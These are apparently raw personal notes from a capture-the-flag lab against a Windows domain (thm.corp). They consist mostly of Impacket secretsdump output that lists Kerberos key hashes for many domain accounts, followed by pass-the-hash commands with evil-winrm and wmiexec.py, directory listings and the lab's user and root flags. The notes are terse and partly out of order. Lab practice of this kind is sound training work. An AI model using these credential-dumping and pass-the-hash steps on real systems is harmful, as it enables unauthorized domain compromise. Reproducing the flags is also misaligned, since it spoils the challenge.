thm.corp\CHRISTINA_MCCORMICK:aes128-cts-hmac-sha1-96:40b228fcf4f1db9a44b010d50a550ce5
thm.corp\CHRISTINA_MCCORMICK:des-cbc-md5:b60b9bd3d0922fda
thm.corp\3811465497SA:aes256-cts-hmac-sha1-96:14387a8d7949ddfb2a722d3de5bb9a6cc6af2fbdc809a7ab405c08af11bb7e3e
thm.corp\3811465497SA:aes128-cts-hmac-sha1-96:aaffad64a360cb51a65b879b2a9e384e
thm.corp\3811465497SA:des-cbc-md5:67c2a8a8807c9b1a
thm.corp\MORGAN_SELLERS:aes256-cts-hmac-sha1-96:033f7f4bd4049f0f851584cdc27e8a63d9c7b303543f61f7d10ae6f3b9cf04c4
thm.corp\MORGAN_SELLERS:aes128-cts-hmac-sha1-96:5f26fb9dd8008f01c242aa3c3f897f78
thm.corp\MORGAN_SELLERS:des-cbc-md5:5daecbf294ea68b9
thm.corp\MARION_CLAY:aes256-cts-hmac-sha1-96:bfc953ace956f262ebd5167b12ee6367b751ce31cac95a454355c893e6566de4
thm.corp\MARION_CLAY:aes128-cts-hmac-sha1-96:7cc07cfae0fd1c15468daabcea3cda34
thm.corp\MARION_CLAY:des-cbc-md5:b0e98667ecd0e694
thm.corp\3966486072SA:aes256-cts-hmac-sha1-96:bb95b7d10401176e108fa4095a427524dd0fc0f320b0804f052f06e6c6c49b19
thm.corp\3966486072SA:aes128-cts-hmac-sha1-96:7c6cb333839a8bced18aec1917d651f6
thm.corp\3966486072SA:des-cbc-md5:a4d69be0611375e9
thm.corp\TED_JACOBSON:aes256-cts-hmac-sha1-96:ba4284a925da9854e7c22ad15427612063b0c934ca45a355dffc2de6aeccbd93
thm.corp\TED_JACOBSON:aes128-cts-hmac-sha1-96:1143504a4dd6c4bdf73a41c937685963
thm.corp\TED_JACOBSON:des-cbc-md5:86859b3d2a619775
thm.corp\AUGUSTA_HAMILTON:aes256-cts-hmac-sha1-96:47f9953dab606f286d6c0da83dab3a43ea54bdb32185fb751d2fe5e9646cdfd0
thm.corp\AUGUSTA_HAMILTON:aes128-cts-hmac-sha1-96:378fc334fc0ec5b209c7a31bb04ef5f7
thm.corp\AUGUSTA_HAMILTON:des-cbc-md5:4cba04ea376b7aef
thm.corp\TREVOR_MELTON:aes256-cts-hmac-sha1-96:0b18752b626fbf08c4a62659fd8b5cc2f40f0d3070df06ea08dd1425ae5eb740
thm.corp\TREVOR_MELTON:aes128-cts-hmac-sha1-96:ba3822302127c27ff08de918b8c7b739
thm.corp\TREVOR_MELTON:des-cbc-md5:700e89ef85ba19f7
thm.corp\LEANN_LONG:aes256-cts-hmac-sha1-96:1bf47f52734c623fc218e36a987bee964e822dfb965471c276cc466dbb8cd11f
thm.corp\LEANN_LONG:aes128-cts-hmac-sha1-96:cb934354d81d548a97c57b253cd05780
thm.corp\LEANN_LONG:des-cbc-md5:92a8e94f8a6d0e58
thm.corp\RAQUEL_BENSON:aes256-cts-hmac-sha1-96:c1a3ea8edc6acf499ed14b1483d16fd87c4885ab3c149ff09ad13bc438ac9ef5
thm.corp\RAQUEL_BENSON:aes128-cts-hmac-sha1-96:c9a4b239762e705fb8df3bafe3441688
thm.corp\RAQUEL_BENSON:des-cbc-md5:b0495dc88f79f2f4
thm.corp\AUTOMATE:aes256-cts-hmac-sha1-96:0b6bdeb9fa2109983faf5111eebf06c03269679305104a30fcf4ed33b884271b
thm.corp\AUTOMATE:aes128-cts-hmac-sha1-96:0a744f81d337cb07cf81f849bef6910c
thm.corp\AUTOMATE:des-cbc-md5:b6d60b329d988986
HAYSTACK$:aes256-cts-hmac-sha1-96:8008d0413fd6d725dac0bec5ad0c05f69876e9cf94296429296725b98a2678b0
HAYSTACK$:aes128-cts-hmac-sha1-96:e10c9244f78c2a908e99a59a36899c97
HAYSTACK$:des-cbc-md5:e9622ad91ccbfe58
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
Exception ignored in: <function Registry.__del__ at 0x7f651e7a0790>
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/winregistry.py", line 182, in __del__
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/winregistry.py", line 179, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/examples/secretsdump.py", line 358, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smbconnection.py", line 603, in closeFile
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 1305, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 423, in sendSMB
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 392, in signSMB
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/crypto.py", line 148, in AES_CMAC
  File "/usr/local/lib/python3.8/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'
Exception ignored in: <function Registry.__del__ at 0x7f651e7a0790>
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/winregistry.py", line 182, in __del__
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/winregistry.py", line 179, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/examples/secretsdump.py", line 358, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smbconnection.py", line 603, in closeFile
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 1305, in close
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 423, in sendSMB
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/smb3.py", line 392, in signSMB
  File "/usr/local/lib/python3.8/dist-packages/impacket-0.10.1.dev1+20230316.112532.f0ac44bd-py3.8.egg/impacket/crypto.py", line 148, in AES_CMAC
  File "/usr/local/lib/python3.8/dist-packages/Cryptodome/Cipher/AES.py", line 228, in new
KeyError: 'Cryptodome.Cipher.AES'

-------------------------------------------------------------------------------------------------------------

Admin password didnt pop anything so opening up bloodhound shows the next best thing is the domain admin accounts we ripped hashes for we can then try and remote manage them with said hashes

root@ip-10-201-17-160:~/ruby-2.7.3/ext/readline# evil-winrm -i 10.201.39.224 -u CECILE_WONG -H 54345a04a2fd1858bf1f3cb46bcce704

this failed

psexec failed

 Directory of C:\Users\Administrator\Desktop



 Directory of C:\Users\automate\Desktop

07/14/2023  07:28 AM    <DIR>          .
07/14/2023  07:28 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:35 PM                31 user.txt
               3 File(s)          1,112 bytes
               2 Dir(s)  12,326,395,904 bytes free

C:\Users\automate\Desktop>type user.txt
THM{AUTOMATION_WILL_REPLACE_US}



07/14/2023  07:23 AM    <DIR>          .
07/14/2023  07:23 AM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/16/2023  04:37 PM                30 root.txt
               3 File(s)          1,111 bytes
               2 Dir(s)  12,329,828,352 bytes free

C:\Users\Administrator\Desktop>type root.txt
THM{RE_RE_RE_SET_AND_DELEGATE}
C:\Users\Administrator\Desktop>exit
root@ip-10-201-17-160:/opt/impacket/examples# wmiexec.py -hashes :067a84e5afaed843ed4a8fdac5facac3 thm.corp/CECILE_WONG@10.201.39.224


